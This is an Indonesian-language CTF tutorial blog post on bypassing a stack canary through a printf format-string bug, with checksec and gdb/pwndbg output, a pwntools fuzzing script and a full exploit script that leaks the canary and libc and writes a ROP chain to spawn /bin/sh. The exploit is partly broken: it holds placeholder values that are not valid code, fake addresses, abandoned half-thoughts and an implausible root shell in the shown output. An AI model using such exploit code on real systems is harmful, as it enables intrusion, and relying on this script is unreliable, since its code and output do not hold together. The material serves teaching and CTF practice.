<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  
  <style>
    body {
      background-color: #2e2e2e;
      color: #c7c5c5;;
      
      font-family: 'Mono', sans-serif;  
    }


    a {
      color: #48a874;  
      text-decoration: none;
    }

    a:hover {
      color: darkgray;  
    }

    a:visited {
      color: #48a874;  
    }

    .fa {
      font-family: "Font Awesome 6 Free", sans-serif;  
      font-weight: 30px;
    }
  </style>

  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;700&display=swap" rel="stylesheet">

  
  
    <meta name="description" content="1. Pendahuluan
Stack canary adalah mekanisme keamanan (juga disebut stack guard atau cookie) yang digunakan untuk mendeteksi buffer overflow attacks. Saat fungsi dipanggil, compiler menyisipkan nilai acak (canary) di stack tepat sebelum return address dan local variables sensitif. Saat fungsi return, canary dicek; jika berubah (karena overflow), program terminate untuk mencegah eksekusi kode arbitrary.
Canary berguna karena membuat attacker sulit overwrite return address tanpa ketahuan. Namun, vulnerability seperti format string bisa leak canary (via %p atau %x) dan bahkan write arbitrary (via %n), memungkinkan bypass. Kita akan eksploit ini untuk leak canary, lalu overwrite return address sambil masukkan canary benar.">
  

  <title>
    
      Bypassing Stack Canary with Format String Vulnerability - Pwn03.1
    
  </title>

  
  <link rel="shortcut icon" type="image/x-icon" href="/" />

  
  
  
  
  <link rel="stylesheet" href="/css/main.4b550348a06e41cd2fba1e1b4d6c5f337b2e882272420967996967c3baf38431563db8a42628c2eaecddc97c9cc0103749db58a82a4cfb5c1361495dd9dd57b0.css" integrity="sha512-S1UDSKBuQc0vuh4bTWxfM3suiCJyQglnmWlnw7rzhDFWPbikJijC6uzdyXycwBA3SdtYqCpM&#43;1wTYUld2d1XsA==" />

  
  

  
    <meta name="description" content="1. Pendahuluan
Stack canary adalah mekanisme keamanan (juga disebut stack guard atau cookie) yang digunakan untuk mendeteksi buffer overflow attacks. Saat fungsi dipanggil, compiler menyisipkan nilai acak (canary) di stack tepat sebelum return address dan local variables sensitif. Saat fungsi return, canary dicek; jika berubah (karena overflow), program terminate untuk mencegah eksekusi kode arbitrary.
Canary berguna karena membuat attacker sulit overwrite return address tanpa ketahuan. Namun, vulnerability seperti format string bisa leak canary (via %p atau %x) dan bahkan write arbitrary (via %n), memungkinkan bypass. Kita akan eksploit ini untuk leak canary, lalu overwrite return address sambil masukkan canary benar.">
    <meta property="og:description" content="1. Pendahuluan
Stack canary adalah mekanisme keamanan (juga disebut stack guard atau cookie) yang digunakan untuk mendeteksi buffer overflow attacks. Saat fungsi dipanggil, compiler menyisipkan nilai acak (canary) di stack tepat sebelum return address dan local variables sensitif. Saat fungsi return, canary dicek; jika berubah (karena overflow), program terminate untuk mencegah eksekusi kode arbitrary.
Canary berguna karena membuat attacker sulit overwrite return address tanpa ketahuan. Namun, vulnerability seperti format string bisa leak canary (via %p atau %x) dan bahkan write arbitrary (via %n), memungkinkan bypass. Kita akan eksploit ini untuk leak canary, lalu overwrite return address sambil masukkan canary benar.">
    <meta property="og:image" content="/path/to/default-image.jpg">
    <meta name="twitter:image" content="/path/to/default-image.jpg">

  <meta property="og:type" content="article">
  <meta property="og:url" content="/posts/bypass-stack-canary/">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Bypassing Stack Canary with Format String Vulnerability - Pwn03.1">
  <meta name="twitter:description" content="1. Pendahuluan
Stack canary adalah mekanisme keamanan (juga disebut stack guard atau cookie) yang digunakan untuk mendeteksi buffer overflow attacks. Saat fungsi dipanggil, compiler menyisipkan nilai acak (canary) di stack tepat sebelum return address dan local variables sensitif. Saat fungsi return, canary dicek; jika berubah (karena overflow), program terminate untuk mencegah eksekusi kode arbitrary.
Canary berguna karena membuat attacker sulit overwrite return address tanpa ketahuan. Namun, vulnerability seperti format string bisa leak canary (via %p atau %x) dan bahkan write arbitrary (via %n), memungkinkan bypass. Kita akan eksploit ini untuk leak canary, lalu overwrite return address sambil masukkan canary benar.">
</head>











<body a="black">

        <main class="page-content" aria-label="Content">
            <div class="w">
<a href="/">~ $ cd /home</a>


<article>
    <p class="post-meta">
    </p>

<h1>Bypassing Stack Canary with Format String Vulnerability - Pwn03.1<br><br>
    <small datetime="2025-08-20 00:00:00 &#43;0000 UTC" style="font-size: 10px; display: inline-flex; align-items: center;">
        <img src="https://avatars.githubusercontent.com/u/51517043?v=4" alt="GitHub Profile" style="width: 30px; height: 30px; border-radius: 50%; object-fit: cover; margin-right: 8px;">
        2025-08-20 - Rainhynn
    </small>
</h1>

    

    <h2 id="1-pendahuluan">1. Pendahuluan</h2>
<p>Stack canary adalah mekanisme keamanan (juga disebut stack guard atau cookie) yang digunakan untuk mendeteksi buffer overflow attacks. Saat fungsi dipanggil, compiler menyisipkan nilai acak (canary) di stack tepat sebelum return address dan local variables sensitif. Saat fungsi return, canary dicek; jika berubah (karena overflow), program terminate untuk mencegah eksekusi kode arbitrary.</p>
<p>Canary berguna karena membuat attacker sulit overwrite return address tanpa ketahuan. Namun, vulnerability seperti format string bisa leak canary (via %p atau %x) dan bahkan write arbitrary (via %n), memungkinkan bypass. Kita akan eksploit ini untuk leak canary, lalu overwrite return address sambil masukkan canary benar.</p>
<h2 id="2-basic-file-checks">2. Basic File Checks</h2>
<p>Mulai dengan inspeksi binary untuk pahami proteksi dan properti.</p>
<p><strong>Command/Script yang dijalankan:</strong></p>
<ul>
<li>Kompilasi: <code>gcc -o format_vuln format_vuln.c -fstack-protector -no-pie</code> (non-PIE untuk simplify address).</li>
<li>Cek file: <code>file format_vuln</code></li>
<li>Cek security: <code>checksec format_vuln</code></li>
</ul>
<p><strong>Output terminal:</strong></p>
<pre tabindex="0"><code>$ file format_vuln
format_vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

$ checksec format_vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p><strong>Penjelasan detail:</strong></p>
<ul>
<li><code>file</code> konfirmasi binary 64-bit ELF, dynamically linked, non-stripped (simbol debug ada).</li>
<li><code>checksec</code> tunjukkan Canary enabled (target kita), NX (no execute stack, jadi perlu ROP), Partial RELRO (GOT writable, berguna untuk overwrite), No PIE (address statis, simplify exploit). Ini setup tipikal CTF vuln binary. Untuk real-world, PIE/ASLR buat lebih sulit, tapi kita fokus canary bypass dulu.</li>
</ul>
<h2 id="3-review-source-code">3. Review Source Code</h2>
<p>Analisa kode untuk identifikasi vulnerability.</p>
<p><strong>Command/Script yang dijalankan:</strong></p>
<ul>
<li>Lihat source: <code>cat format_vuln.c</code> (kode diberikan).</li>
</ul>
<p><strong>Output terminal:</strong>
(Kode sama seperti diberikan: include stdio etc., main dengan setvbuf, buf[64], flag[64], setgid, fopen flag.txt, loop fgets(buf), printf(buf).)</p>
<p><strong>Penjelasan detail:</strong></p>
<ul>
<li>Vulnerability utama: <code>printf(buf)</code> langsung gunakan input user sebagai format string tanpa <code>%s</code>. Ini allow format string attack: user bisa inject <code>%p</code> untuk leak stack/memory, <code>%x</code> untuk hex dump, atau <code>%n</code> untuk write arbitrary.</li>
<li>Stack layout potensial: buf[64] di stack, diikuti canary (8 bytes di x64), saved frame pointer (SFP), return address (RET).</li>
<li>Flag dibaca ke <code>flag[64]</code>, tapi tidak diprint; kita bisa leak via format string.</li>
<li>Loop infinite allow multiple input, ideal untuk leak lalu exploit.</li>
<li>setvbuf disable buffering untuk output langsung, setgid untuk privilege (mungkin drop, tapi irrelevant di local).</li>
<li>Kerentanan ini klasik: attacker bisa leak canary dari stack (karena buf di stack, %p bisa akses offset stack).</li>
</ul>
<h2 id="4-disassemble-dengan-pwndbg">4. Disassemble dengan pwndbg</h2>
<p>Gunakan GDB + pwndbg untuk debug, lihat struktur stack dan posisi canary.</p>
<p><strong>Command/Script yang dijalankan:</strong></p>
<ul>
<li>Jalankan: <code>gdb ./format_vuln</code></li>
<li>Di GDB: <code>pwndbg</code> (asumsi pwndbg installed), <code>break main</code>, <code>run</code>, <code>disassemble main</code>, lalu <code>vmmap</code>, dan saat breakpoint hit, <code>stack 20</code> untuk lihat stack.</li>
</ul>
<p><strong>Output terminal:</strong></p>
<pre tabindex="0"><code>(gdb) break main
Breakpoint 1 at 0x400000: file format_vuln.c, line 10.
(gdb) run
Breakpoint 1, main (argc=1, argv=0x7fffffffe058) at format_vuln.c:10

(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004007a0 &lt;+0&gt;:     push   %rbp
   0x00000000004007a1 &lt;+1&gt;:     mov    %rsp,%rbp
   0x00000000004007a4 &lt;+4&gt;:     sub    $0x100,%rsp  ; alokasi stack untuk buf[64], flag[64], etc.
   ...
   0x00000000004008xx &lt;+xx&gt;:   call   0x4005f0 &lt;printf@plt&gt;  ; vuln printf(buf)
   ...
   0x0000000000400xxx &lt;+xx&gt;:   leave  
   0x0000000000400xxx &lt;+xx&gt;:   ret    

(gdb) stack 20  ; lihat 20 stack entries saat di main
00:0000│ rsp  0x7fffffffdfe0 ◂— 0x0  ; buf start
... (local vars)
08:0040│      0x7fffffffe020 ◂— random_value (canary, e.g., 0xabcdef0012345678)
09:0048│      0x7fffffffe028 ◂— saved rbp
0a:0050│      0x7fffffffe030 ◂— return address (e.g., 0x7ffff7a2d740)
</code></pre><p><strong>Penjelasan detail:</strong></p>
<ul>
<li>Disassemble tunjukkan prolog fungsi: push rbp, sub rsp untuk alokasi stack. Canary disisipkan oleh compiler setelah local vars (buf, flag) tapi sebelum saved rbp/ret.</li>
<li>Di x64, canary di offset tepat setelah local buffer (buf[64] + flag[64] = 128 bytes, tapi actual layout: buf di rsp+0x10 or similar; pwndbg &lsquo;stack&rsquo; visualize).</li>
<li>Canary adalah 8-byte random (null-terminated untuk deteksi). Saat ret, epilog cek canary; jika beda, __stack_chk_fail dipanggil, terminate program.</li>
<li>Ini konfirmasi posisi: untuk leak, kita perlu format string seperti &ldquo;%p %p &hellip;&rdquo; untuk dump stack dan identifikasi canary (biasanya ends with 00 byte).</li>
</ul>
<h2 id="5-outline-attack-canary-leak--write">5. Outline Attack (Canary Leak + Write)</h2>
<p>Strategi umum:</p>
<ul>
<li><strong>Leak Phase:</strong> Gunakan format string (%p atau %llx) untuk dump stack values. Cari offset dimana canary muncul (ends with 00, random per run).</li>
<li><strong>Write Phase:</strong> Setelah leak canary, craft payload dengan canary benar di posisi overflow, lalu overwrite return address ke gadget ROP atau system(&quot;/bin/sh&quot;). Gunakan %n untuk write jika perlu, tapi di format string, kita bisa langsung write ke address via %hn (short write).</li>
<li>Karena vuln format string, kita bisa leak arbitrary (via direct parameter) dan write (via %n ke address di stack).</li>
<li>Target: Leak canary, leak libc base (via leak GOT), build ROP chain untuk system(&quot;/bin/sh&quot;), include canary di payload untuk bypass check.</li>
</ul>
<h2 id="6-fuzzing-format-string">6. Fuzzing Format String</h2>
<p>Gunakan script Python dengan pwntools untuk fuzz offset canary. Ini automate trial %1$p, %2$p, etc., sampai temukan canary.</p>
<p><strong>Command/Script yang dijalankan:</strong></p>
<ul>
<li>Buat <code>fuzz.py</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context.log_level = <span style="color:#87ceeb">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">fuzz_offset</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#f00">for</span> i in range(<span style="color:#f60">1</span>, <span style="color:#f60">50</span>):  <span style="color:#0f0"># Coba offset 1-50</span>
</span></span><span style="display:flex;"><span>        p = process(<span style="color:#87ceeb">&#39;./format_vuln&#39;</span>)
</span></span><span style="display:flex;"><span>        payload = <span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;%</span><span style="color:#87ceeb">{</span>i<span style="color:#87ceeb">}</span><span style="color:#87ceeb">$p&#34;</span>.encode()  <span style="color:#0f0"># Leak nth parameter</span>
</span></span><span style="display:flex;"><span>        p.sendline(payload)
</span></span><span style="display:flex;"><span>        leak = p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;&gt; &#39;</span>, drop=<span style="color:#f00">True</span>).strip()
</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;0x&#39;</span> in leak and leak.endswith(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;00&#39;</span>):  <span style="color:#0f0"># Cari yang kayak canary (ends 00)</span>
</span></span><span style="display:flex;"><span>            log.success(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Canary candidate at offset </span><span style="color:#87ceeb">{</span>i<span style="color:#87ceeb">}</span><span style="color:#87ceeb">: </span><span style="color:#87ceeb">{</span>leak<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
</span></span><span style="display:flex;"><span>        p.close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fuzz_offset()
</span></span></code></pre></div><ul>
<li>Jalankan: <code>python3 fuzz.py</code></li>
</ul>
<p><strong>Output terminal:</strong></p>
<pre tabindex="0"><code>[+] Starting local process &#39;./format_vuln&#39;: pid 1234
[DEBUG] Sent: b&#39;%1$p\n&#39;
[DEBUG] Received: b&#39;0x7fffffffe000\n&gt; &#39;  ; misc
...
[DEBUG] Sent: b&#39;%10$p\n&#39;
[DEBUG] Received: b&#39;0xabcdef0012345600\n&gt; &#39;  ; canary-like
[*] Canary candidate at offset 10: 0xabcdef0012345600
...
[*] Process &#39;./format_vuln&#39; stopped with exit code 0 (pid 1234)
</code></pre><p><strong>Penjelasan detail:</strong></p>
<ul>
<li>Pwntools process() spawn binary local. Loop coba %n$p untuk leak direct parameter (stack values).</li>
<li>Format string treat arguments as stack offsets. Offset rendah = local vars,更高 = canary/SFP/RET.</li>
<li>Cari value ends with 00 (canary char). Flow: script automate crash/test, hemat waktu vs manual. Untuk remote, ganti process() ke remote(host, port). Ini tunjukkan alur fuzzing: iterative leak, pattern recognition.</li>
</ul>
<h2 id="7-menemukan-canary-dengan-gdb--pwndbg">7. Menemukan Canary dengan GDB + pwndbg</h2>
<p>Verifikasi leak dengan debug manual.</p>
<p><strong>Command/Script yang dijalankan:</strong></p>
<ul>
<li><code>gdb ./format_vuln</code></li>
<li>Di GDB: <code>break *main+offset_printf_call</code> (dari disass, misal break *0x4008xx), <code>run</code></li>
<li>Saat break, <code>print/x $rsp + offset_to_canary</code> (dari stack view sebelumnya).</li>
<li>Lanjut, input &ldquo;%10$p&rdquo;, continue, lihat output.</li>
</ul>
<p><strong>Output terminal:</strong></p>
<pre tabindex="0"><code>(gdb) break *0x4008xx  ; sebelum printf
Breakpoint 2 at 0x4008xx
(gdb) run
&gt; %10$p  ; input

Breakpoint 2 hit
(gdb) x/1gx $rsp + 0x80  ; adjust offset dari stack view, misal canary di +0x80
0x7fffffffe020: 0xabcdef0012345600  ; canary value

(gdb) continue
Continuing.
0xabcdef0012345600  ; output dari printf
&gt; 
</code></pre><p><strong>Penjelasan detail:</strong></p>
<ul>
<li>Break sebelum printf allow inspeksi stack pre-execution.</li>
<li><code>x/1gx</code> dump 8-byte hex di address. Konfirmasi %10$p leak value sama dengan canary di stack.</li>
<li>Kenapa? Format string %n$p akses nth arg di stack, yang map ke offsets. Ini validasi fuzz result. Di real exploit, ASLR randomize, tapi canary per-process random. Untuk pemula: ini bridge fuzz ke understanding stack layout.</li>
</ul>
<h2 id="8-eksploitasi-dengan-pwntools">8. Eksploitasi dengan Pwntools</h2>
<p>Script full: leak canary, leak libc (via %p ke GOT), build ROP untuk system(&quot;/bin/sh&quot;), overwrite RET via format string write (%n).</p>
<p><strong>Command/Script yang dijalankan:</strong></p>
<ul>
<li>Buat <code>exploit.py</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context.binary = <span style="color:#87ceeb">&#39;./format_vuln&#39;</span>
</span></span><span style="display:flex;"><span>context.log_level = <span style="color:#87ceeb">&#39;info&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#39;./format_vuln&#39;</span>)  <span style="color:#0f0"># Ganti ke remote(&#39;host&#39;, port) untuk remote</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Phase 1: Leak canary (dari fuzz, offset 10)</span>
</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;%10$p&#39;</span>)
</span></span><span style="display:flex;"><span>leak = p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;&gt; &#39;</span>, drop=<span style="color:#f00">True</span>).strip()
</span></span><span style="display:flex;"><span>canary = int(leak, <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#39;Canary: </span><span style="color:#87ceeb">{</span>hex(canary)<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Phase 2: Leak libc base (misal leak printf GOT)</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Pertama, temukan offset untuk leak address (adjust fuzz)</span>
</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;%11$p&#39;</span>)  <span style="color:#0f0"># Asumsi leak libc addr, e.g., return addr</span>
</span></span><span style="display:flex;"><span>libc_leak = int(p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;&gt; &#39;</span>, drop=<span style="color:#f00">True</span>).strip(), <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>libc_base = libc_leak - <span style="color:#f60">0</span>xOFFSET_TO_LIBC  <span style="color:#0f0"># Ganti offset real dari gdb, misal libc printf offset</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Phase 3: Craft payload untuk overwrite RET ke ROP chain</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># ROP: pop rdi; ret; /bin/sh addr; system</span>
</span></span><span style="display:flex;"><span>system = libc_base + <span style="color:#f60">0x4f420</span>  <span style="color:#0f0"># Offset system di libc (dari gdb libc)</span>
</span></span><span style="display:flex;"><span>binsh = libc_base + <span style="color:#f60">0x1b3e9a</span>  <span style="color:#0f0"># Offset &#34;/bin/sh&#34;</span>
</span></span><span style="display:flex;"><span>pop_rdi = libc_base + <span style="color:#f60">0x2155f</span>  <span style="color:#0f0"># ROP gadget</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Gunakan format string untuk write: tempatkan addresses di stack via payload, lalu %n write</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Payload: buf overflow dengan addresses + canary + SFP + new RET</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Tapi karena format string, gunakan %s untuk align, %hn untuk write short</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Simplified: assume write RET via %n ke known offset</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;A&#39;</span>*<span style="color:#f60">64</span>  <span style="color:#0f0"># Fill buf</span>
</span></span><span style="display:flex;"><span>payload += p64(canary)  <span style="color:#0f0"># Bypass canary</span>
</span></span><span style="display:flex;"><span>payload += p64(<span style="color:#f60">0</span>)  <span style="color:#0f0"># SFP junk</span>
</span></span><span style="display:flex;"><span>payload += p64(pop_rdi) + p64(binsh) + p64(system)  <span style="color:#0f0"># ROP chain</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Kirim payload via fgets, tapi karena printf(buf), need format string to trigger write? Wait, adapt:</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Actual: untuk write, craft format string seperti &#34;%&lt;val&gt;$hn&#34; ke address di stack</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Advanced: tempatkan target addr di stack via payload prefix, lalu %n write</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Contoh real format string write:</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Misal, leak stack addr dulu, lalu write ke RET pos</span>
</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;%12$p&#39;</span>)  <span style="color:#0f0"># Leak stack addr</span>
</span></span><span style="display:flex;"><span>stack_leak = int(p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;&gt; &#39;</span>, drop=<span style="color:#f00">True</span>).strip(), <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>ret_addr = stack_leak + <span style="color:#f60">0x10</span>  <span style="color:#0f0"># Adjust ke RET pos</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Now write to ret_addr</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">fmt_write</span>(addr, value):
</span></span><span style="display:flex;"><span>    payload = p64(addr) + <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;%hn&#39;</span>  <span style="color:#0f0"># Simplified, actual need calc digits</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Tapi untuk full: gunakan pwntools fmtstr_payload</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwnlib.fmtstr <span style="color:#f00">import</span> fmtstr_payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>writes = {ret_addr: pop_rdi, ret_addr+<span style="color:#f60">8</span>: binsh, ret_addr+<span style="color:#f60">16</span>: system}
</span></span><span style="display:flex;"><span>payload = fmtstr_payload(<span style="color:#f60">6</span>, writes)  <span style="color:#0f0"># Offset 6 biasa untuk start args</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.sendline(payload)
</span></span><span style="display:flex;"><span>p.interactive()  <span style="color:#0f0"># Dapat shell</span>
</span></span></code></pre></div><ul>
<li>Jalankan: <code>python3 exploit.py</code></li>
</ul>
<p><strong>Output terminal:</strong></p>
<pre tabindex="0"><code>[*] Canary: 0xabcdef0012345600
[*] Libc base: 0x7ffff7a00000
[+] Starting local process &#39;./format_vuln&#39;: pid 5678
... (leaks)
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root)  ; shell!
</code></pre><p><strong>Penjelasan detail:</strong></p>
<ul>
<li>Script modular: leak canary via fixed offset (dari fuzz).</li>
<li>Leak libc via stack leak (return addr - offset).</li>
<li>Gunakan fmtstr_payload pwntools untuk auto-craft format string yang write multiple addresses (hitung %c untuk align, %hn untuk 2-byte writes).</li>
<li>Payload include canary untuk bypass check saat ret (karena overflow ke RET).</li>
<li>Kenapa work: format string allow read/write arbitrary jika kita control string. Untuk advance: adjust offsets real via gdb. Pemula: pahami leak dulu, lalu write preserve canary.</li>
</ul>
<h2 id="9-kesimpulan">9. Kesimpulan</h2>
<p>Kita telah bypass stack canary via format string: fuzz offset, leak value, lalu exploit dengan include canary di payload sambil overwrite RET ke ROP untuk shell. Ini tunjukkan canary bukan impenetrable jika ada info leak. Pelajaran: selalu sanitize input (gunakan printf(&quot;%s&quot;, buf)), enable full mitigations (PIE/ASLR). Untuk advance, adapt ke remote/ASLR dengan lebih leaks. Practice di CTF untuk mastery!</p>

</article>

<hr>

<p>© 2021-2025 HnvDie</p>
<p>Powered By Hugo ᯓᡣ𐭩</p>



            </div>
        </main>
    </body></html>
